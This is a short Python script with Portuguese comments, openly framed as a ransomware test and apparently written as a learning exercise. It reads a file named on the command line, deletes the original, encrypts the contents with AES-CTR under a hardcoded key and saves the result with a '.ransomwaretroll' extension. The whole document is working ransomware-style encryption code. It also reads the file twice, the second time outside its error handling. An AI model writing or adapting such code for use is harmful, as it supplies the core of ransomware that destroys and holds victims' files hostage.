import os
import pyaes
import sys

# Verificar se o nome do arquivo foi passado como argumento
if len(sys.argv) != 2:
    print("Uso: python encrypter.py <nome_do_arquivo>")
    sys.exit(1)

# Obter o nome do arquivo do argumento de linha de comando
file_name = sys.argv[1]

## abrir o arquivo a ser criptografado
# Abrir, ler e fechar o arquivo
try:
    with open(file_name, "rb") as file:
        file_data = file.read()
    print("Arquivo lido com sucesso!")
except FileNotFoundError:
    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
except Exception as e:
    print(f"Erro ao ler o arquivo: {e}")
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
